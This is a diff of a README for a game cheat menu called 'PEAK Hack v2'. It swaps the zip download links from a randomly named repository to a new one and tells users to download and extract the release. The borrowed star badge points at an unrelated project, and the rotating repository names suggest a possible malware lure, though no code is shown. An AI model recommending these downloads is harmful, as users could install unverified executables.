@@ -1,7 +1,7 @@
-# PEAK Hack v2 (Cheat menu) - 23-Aug-2026
+# PEAK Hack v2 (Cheat menu) - 28-Aug-2026
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/AmplitudeStarling/rhaiipua/releases/download/v2/PEAK_v2.10.zip)
-[![GitHub release](https://img.shields.io/badge/Release-2.10-blue?style=for-the-badge)](https://github.com/AmplitudeStarling/rhaiipua/releases/download/v2/PEAK_v2.10.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/AmplitudeStarling/PEAK-Hack-v2/releases/download/v2/PEAK_v2.10.zip)
+[![GitHub release](https://img.shields.io/badge/Release-2.10-blue?style=for-the-badge)](https://github.com/AmplitudeStarling/PEAK-Hack-v2/releases/download/v2/PEAK_v2.10.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/Azure-Peak/Azure-Peak?style=for-the-badge&logo=github)](https://github.com/AmplitudeStarling/PEAK-Hack-v2/stargazers)
 
@@ -72,7 +72,7 @@ Check out the Features list
 
 ## How to Install
 
-1. Download the [latest release build](https://github.com/AmplitudeStarling/rhaiipua/releases/download/v2/PEAK_v2.10.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/AmplitudeStarling/PEAK-Hack-v2/releases/download/v2/PEAK_v2.10.zip) from repo's Releases page.
 
 2. Extract the contents to any folder (e.g., `C:\Peak-cheatos`).
 
